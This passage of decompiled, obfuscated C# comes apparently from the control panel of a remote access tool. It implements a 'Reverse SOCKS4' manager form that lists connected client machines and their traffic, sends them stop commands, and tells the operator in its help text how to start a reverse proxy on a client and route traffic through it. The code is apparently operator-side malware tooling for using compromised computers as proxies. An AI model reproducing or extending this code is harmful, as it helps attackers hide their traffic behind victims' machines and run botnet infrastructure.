		this.vmethod_0().Text = "Start";
		this.vmethod_0().Enabled = true;
	}

	// Token: 0x06001734 RID: 5940 RVA: 0x0000C051 File Offset: 0x0000A251
	private void method_8(object sender, EventArgs e)
	{
		this.vmethod_0().Enabled = false;
		if (Class130.struct18_2.method_0())
		{
			this.method_7();
			return;
		}
		this.method_6();
	}

	// Token: 0x06001735 RID: 5941 RVA: 0x00007348 File Offset: 0x00005548
	private void fSocks4R_Closing(object sender, CancelEventArgs e)
	{
		base.Visible = false;
		e.Cancel = true;
	}

	// Token: 0x06001736 RID: 5942 RVA: 0x0000C078 File Offset: 0x0000A278
	private void method_9(object sender, DoWorkEventArgs e)
	{
		for (;;)
		{
			this.method_3();
			this.method_4();
			this.method_5();
			Thread.Sleep(1000);
		}
	}

	// Token: 0x06001737 RID: 5943 RVA: 0x000ABCF8 File Offset: 0x000A9EF8
	private void method_10(object sender, KeyEventArgs e)
	{
		if (e.KeyData == (Keys)131137)
		{
			try
			{
				foreach (object obj in this.vmethod_48().Items)
				{
					((ListViewItem)obj).Selected = true;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x06001738 RID: 5944 RVA: 0x000ABD64 File Offset: 0x000A9F64
	private void method_11(object sender, EventArgs e)
	{
		try
		{
			if (this.cSocks4Server_0 == null)
			{
				this.vmethod_50().Text = "Status: N/A";
			}
			else
			{
				this.vmethod_50().Text = Conversions.ToString(Operators.ConcatenateObject("Status: ", Interaction.IIf(Class130.struct18_2.method_0(), "Reverse SOCKS4 server is active.", "N/A")));
			}
			this.vmethod_40().Text = "Active SOCKS4 clients: " + Conversions.ToString(this.vmethod_48().Items.Count);
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06001739 RID: 5945 RVA: 0x000ABE08 File Offset: 0x000AA008
	private void method_12(object sender, FormatRowEventArgs e)
	{
		try
		{
			cSocks4Rcli cSocks4Rcli = (cSocks4Rcli)e.Model;
			if (cSocks4Rcli.bJustConnected)
			{
				e.Item.BackColor = Color.LimeGreen;
			}
			else if (!cSocks4Rcli.pending_dc & !cSocks4Rcli.pending_dc_timeout)
			{
				e.Item.BackColor = Color.White;
			}
			else if (cSocks4Rcli.pending_dc & cSocks4Rcli.pending_dc_timeout)
			{
				e.Item.BackColor = Color.Yellow;
				if (e.Item.Focused)
				{
					e.ListView.DeselectAll();
				}
				e.Item.Selected = false;
			}
			else if (cSocks4Rcli.pending_dc & !cSocks4Rcli.pending_dc_timeout)
			{
				e.Item.BackColor = Color.Red;
				if (e.Item.Focused)
				{
					e.ListView.DeselectAll();
				}
				e.Item.Selected = false;
			}
			if (cSocks4Rcli.rejected)
			{
				e.Item.BackColor = Color.LightGray;
				if (e.Item.Focused)
				{
					e.ListView.DeselectAll();
				}
				e.Item.Selected = false;
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600173A RID: 5946 RVA: 0x000ABF5C File Offset: 0x000AA15C
	private void method_13(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_48();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					string key = ((cSocks4Rcli)obj).Key;
					string string_ = "socks4r_stop|1";
					string string_2 = key;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = string_2;
					@class.string_1 = string_;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x0600173B RID: 5947 RVA: 0x000AC044 File Offset: 0x000AA244
	private void method_14(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_48();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					cSocks4Rcli cSocks4Rcli = (cSocks4Rcli)obj;
					stringBuilder.Append(cSocks4Rcli.PORT + "\r\n");
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x0600173C RID: 5948 RVA: 0x000AC0F8 File Offset: 0x000AA2F8
	private void method_15(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_48();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					cSocks4Rcli cSocks4Rcli = (cSocks4Rcli)obj;
					stringBuilder.Append(string.Concat(new string[]
					{
						cSocks4Rcli.USER,
						"\t",
						cSocks4Rcli.IP,
						"\t",
						cSocks4Rcli.PORT,
						"\t",
						cSocks4Rcli.SENT,
						"\t",
						cSocks4Rcli.RECV,
						"\t",
						cSocks4Rcli.SPEED_DL,
						"\t",
						cSocks4Rcli.SPEED_UL,
						"\t",
						cSocks4Rcli.TARGET,
						"\t",
						cSocks4Rcli.DURATION,
						"\r\n"
					}));
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x0600173D RID: 5949 RVA: 0x000AC254 File Offset: 0x000AA454
	private void method_16(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_48();
		try
		{
			foreach (object obj in fastObjectListView.Objects)
			{
				cSocks4Rcli cSocks4Rcli = (cSocks4Rcli)obj;
				stringBuilder.Append(string.Concat(new string[]
				{
					cSocks4Rcli.USER,
					"\t",
					cSocks4Rcli.IP,
					"\t",
					cSocks4Rcli.PORT,
					"\t",
					cSocks4Rcli.SENT,
					"\t",
					cSocks4Rcli.RECV,
					"\t",
					cSocks4Rcli.SPEED_DL,
					"\t",
					cSocks4Rcli.SPEED_UL,
					"\t",
					cSocks4Rcli.TARGET,
					"\t",
					cSocks4Rcli.DURATION,
					"\r\n"
				}));
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x0600173E RID: 5950 RVA: 0x000AC39C File Offset: 0x000AA59C
	private void method_17(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_48();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					cSocks4Rcli cSocks4Rcli = (cSocks4Rcli)obj;
					cSocks4Rcli.dSent = 0.0;
					cSocks4Rcli.dRecv = 0.0;
					cSocks4Rcli.TARGET = "N/A";
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x0600173F RID: 5951 RVA: 0x000AC430 File Offset: 0x000AA630
	private void method_18(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_48();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				IEnumerator enumerator = fastObjectListView.SelectedObjects.GetEnumerator();
				if (enumerator.MoveNext())
				{
					cSocks4Rcli cSocks4Rcli = (cSocks4Rcli)enumerator.Current;
					Process.Start("http://" + cSocks4Rcli.TARGET);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x06001740 RID: 5952 RVA: 0x0000C097 File Offset: 0x0000A297
	private void method_19(object sender, EventArgs e)
	{
		Interaction.MsgBox("The reverse SOCKS4 proxy may use a wide range of ports usually starting from 30000 and up for maximum performance.\r\nThe number of ports used is relative to the number of total connections.\r\n\r\nNOTE: Ports starting from 30000 to 65535 must be open/forwarded in order to use this feature!", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06001741 RID: 5953 RVA: 0x0000C0AB File Offset: 0x0000A2AB
	private void method_20(object sender, EventArgs e)
	{
		Interaction.MsgBox("It's very important to keep in mind that a proxy may not always prevent DNS, WebRTC and other type of leaks.\r\n\r\nIf privacy is of utmost importance, consider using a trusted VPN tunnel or similar that prevents unwanted data leaks.", MsgBoxStyle.Exclamation, Application.ProductName);
	}

	// Token: 0x06001742 RID: 5954 RVA: 0x0000C0BF File Offset: 0x0000A2BF
	private void method_21(object sender, EventArgs e)
	{
		Interaction.MsgBox("Using the Reverse SOCKS4 feature is easy to use if utilized properly.\r\n\r\nBefore starting, keep in mind that ports starting from 30000 to 65535 need be open/forwarded in order to use this feature.\r\nIf you can't open/forward that range ports, it's recommended to use a trusted VPN that can provide a static/dedicated IP. Those usually have almost all ports forwarded/open and provide added layers of security.\r\n\r\nTo begin, click Start and wait for the status to confirm that it's listening on a port.\r\n\r\nOnce the SOCKS4 manager is activated, you'll need to connect a client by right-clicking on it and select: \r\nClient > Networking > Reverse SOCKS4 > Start\r\n\r\nThe client should soon appear in the SOCKS4 manager.\r\nFinally, to begin the reverse proxy, use the IP 127.0.0.1 and the port shown in the list next to the client's IP with your proxy tool/software of choice.", MsgBoxStyle.Question, Application.ProductName);
	}

	// Token: 0x040008A3 RID: 2211
	private VisualButton visualButton_0;

	// Token: 0x040008A4 RID: 2212
	private BackgroundWorker backgroundWorker_0;

	// Token: 0x040008A5 RID: 2213
	private ToolStripMenuItem toolStripMenuItem_0;

	// Token: 0x040008A6 RID: 2214
	private ToolStripMenuItem toolStripMenuItem_1;

	// Token: 0x040008A7 RID: 2215
	private ToolStripSeparator toolStripSeparator_0;

	// Token: 0x040008A8 RID: 2216
	private ToolStripMenuItem toolStripMenuItem_2;

	// Token: 0x040008A9 RID: 2217
	private ToolStripMenuItem toolStripMenuItem_3;

	// Token: 0x040008AA RID: 2218
	private ToolStripSeparator toolStripSeparator_1;

	// Token: 0x040008AB RID: 2219
	private ToolStripMenuItem toolStripMenuItem_4;

	// Token: 0x040008AC RID: 2220
	private ToolStripMenuItem toolStripMenuItem_5;

	// Token: 0x040008AD RID: 2221
	private ContextMenuStrip contextMenuStrip_0;

	// Token: 0x040008AE RID: 2222
	private OLVColumn olvcolumn_0;

	// Token: 0x040008AF RID: 2223
	private PictureBox pictureBox_0;

	// Token: 0x040008B0 RID: 2224
	private OLVColumn olvcolumn_1;

	// Token: 0x040008B1 RID: 2225
	private OLVColumn olvcolumn_2;

	// Token: 0x040008B2 RID: 2226
	private OLVColumn olvcolumn_3;

	// Token: 0x040008B3 RID: 2227
	private OLVColumn olvcolumn_4;

	// Token: 0x040008B4 RID: 2228
	private OLVColumn olvcolumn_5;

	// Token: 0x040008B5 RID: 2229
	private OLVColumn olvcolumn_6;

	// Token: 0x040008B6 RID: 2230
	private OLVColumn olvcolumn_7;

	// Token: 0x040008B7 RID: 2231
	private ToolStripStatusLabel toolStripStatusLabel_0;

	// Token: 0x040008B8 RID: 2232
	private StatusStrip statusStrip_0;

	// Token: 0x040008B9 RID: 2233
	private System.Windows.Forms.Timer timer_0;

	// Token: 0x040008BA RID: 2234
	private OLVColumn olvcolumn_8;

	// Token: 0x040008BB RID: 2235
	private FastObjectListView fastObjectListView_0;

	// Token: 0x040008BC RID: 2236
	private ToolStripStatusLabel toolStripStatusLabel_1;

	// Token: 0x040008BD RID: 2237
	private ToolStripSeparator toolStripSeparator_2;

	// Token: 0x040008BE RID: 2238
	private ToolStripMenuItem toolStripMenuItem_6;

	// Token: 0x040008BF RID: 2239
	private ToolStripMenuItem toolStripMenuItem_7;

	// Token: 0x040008C0 RID: 2240
	private ToolStripSeparator toolStripSeparator_3;

	// Token: 0x040008C1 RID: 2241
	private PictureBox pictureBox_1;

	// Token: 0x040008C2 RID: 2242
	private PictureBox pictureBox_2;

	// Token: 0x040008C3 RID: 2243
	public cSocks4Server cSocks4Server_0;

	// Token: 0x040008C4 RID: 2244
	public ConcurrentStack<cSocks4Rcli> concurrentStack_0;

	// Token: 0x040008C5 RID: 2245
	public ConcurrentStack<cSocks4Rcli> concurrentStack_1;

	// Token: 0x040008C6 RID: 2246
	public ConcurrentStack<cSocks4Rcli> concurrentStack_2;

	// Token: 0x020001A0 RID: 416
	// (Invoke) Token: 0x06001746 RID: 5958
	private delegate void Delegate161(string string_0, string[] string_1);

	// Token: 0x020001A1 RID: 417
	// (Invoke) Token: 0x0600174A RID: 5962
	private delegate void Delegate162();

	// Token: 0x020001A2 RID: 418
	// (Invoke) Token: 0x0600174E RID: 5966
	private delegate void Delegate163();

	// Token: 0x020001A3 RID: 419
	// (Invoke) Token: 0x06001752 RID: 5970
	private delegate void Delegate164();

	// Token: 0x020001A4 RID: 420
	// (Invoke) Token: 0x06001756 RID: 5974
	private delegate void Delegate165(string string_0);

	// Token: 0x020001A5 RID: 421
	// (Invoke) Token: 0x0600175A RID: 5978
	private delegate void Delegate166(string string_0, string string_1, string string_2, string string_3);
}
